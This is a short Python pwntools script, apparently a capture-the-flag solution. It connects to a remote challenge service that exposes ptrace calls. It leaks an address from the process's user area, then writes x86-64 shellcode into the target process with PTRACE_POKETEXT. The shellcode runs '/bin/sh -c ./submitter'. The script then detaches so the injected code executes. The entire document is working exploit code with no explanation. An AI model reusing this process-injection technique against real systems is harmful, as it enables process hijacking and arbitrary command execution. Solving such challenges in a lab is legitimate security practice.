from pwn import *
def sendRequest(r, request, addr, data, cont=b"1"):
    r.sendline(hex(request).encode())
    r.sendline(hex(addr).encode())
    r.sendline(hex(data).encode())
    r.recvuntil(b"ptrace returned ")
    res = r.recvuntil(b"\n")
    r.recvuntil(b"Do another (0/1)?")
    r.sendline(cont)
    return int(res.decode("ascii"), 16)

PTRACE_PEEKUSER = 3
PTRACE_POKETEXT = 5

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
r = remote(HOST, int(PORT))
#r = process("./challenge")

huynya = sendRequest(r, PTRACE_PEEKUSER, 128, 0)
print(hex(huynya))

sh = b"\x90"*8+b'H\xb8/bin/sh\x00\x99PT_Rfh-cT^R\xe8\x0c\x00\x00\x00./submitter\x00VWT^j;X\x0f\x05'
#r.interactive()
for i in range(len(sh)//8):
    print(hex(sendRequest(r, PTRACE_POKETEXT, huynya+i*8, struct.unpack("Q", sh[i*8:(i+1)*8])[0])))

sendRequest(r, 17, 0, 0, b"0")
print(r.recvall().decode())
